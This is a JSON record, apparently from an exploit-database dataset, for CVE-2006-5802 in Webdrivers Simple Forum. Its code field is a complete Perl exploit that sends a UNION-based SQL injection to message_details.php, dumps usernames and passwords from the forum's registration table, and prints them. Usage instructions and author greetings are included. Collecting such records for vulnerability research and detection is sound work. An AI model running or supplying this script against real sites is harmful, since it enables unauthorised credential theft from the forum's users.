{
  "id": "2722",
  "title": "Webdrivers Simple Forum - &#039;message_details.php&#039; SQL Injection",
  "cve": "CVE-2006-5802",
  "vuln_type": "sqli",
  "code": "#!perl\r\nuse IO::Socket;\r\n#Download:http://www.thewebdrivers.com/forum.zip\r\n#By:Bl0od3r\r\n#Germany =]\r\nif (@ARGV<3) {\r\n&header;\r\n} else {\r\n&get();\r\n}\r\nsub get() {\r\n$host=$ARGV[0];\r\n$path=$ARGV[1];\r\n   $id=$ARGV[2];\r\n$socket=IO::Socket::INET->new(Proto=>\"tcp\",PeerAddr=>\"$host\",PeerPort=>80)\r\nor die (\"[-]Error\\n\");\r\nprint \"[~]Connecting!\\n\";\r\nprint \"[~]Getting Data!\\n\";\r\nprint $socket \"GET \".$path.\"message_details.php?id=-1%20UNION%20SELECT%201,password,username,4,4%20FROM%20tbl_register WHERE id=\".$id.\"/* HTTP/1.1\\n\";\r\nprint $socket \"Host: $host\\n\";\r\nprint $socket \"Accept: */*\\n\";\r\nprint $socket \"Connection: close\\n\\n\";\r\n\r\nwhile ($ans=<$socket>) {\r\n$ans=~ m/<span class=\"style3\">&nbsp;Re :  -(.*?)-/ && print \"--------------------------------------------\\n[+]UserName: $1\\n[+]PassWord:\";\r\n$ans=~ m/<td class=\\\"text\\\">(.*?)<\\/td>/ && print \"$1\\n\";\r\nif ($1) {\r\n$success=1; } else { $success=0;};\r\n}\r\nif ($success==\"1\") {\r\nprint \"\\n[+]Successed!\";\r\n  } else {\r\nprint \"[-]Error\";\r\n    }\r\n  }\r\nsub header() {\r\nprint\r\n\"--------------------------------------------------------------------\\n\";\r\nprint \"|\\t---------->By Bl0od3r<---------\\t\\t\\t\\t    |\";\r\nprint \"\\n|Usage:script.pl host.com /path/ 1\\t\\t\\t\\t    |\";\r\nprint\r\n\"\\n--------------------------------------------------------------------\\n\";\r\nexit;\r\n}\r\n\r\n# greetz to all dc3 members,matrix_killer and skOd =]\r\n\r\n# milw0rm.com [2006-11-05]",
  "url": "https://www.exploit-db.com/exploits/2722"
}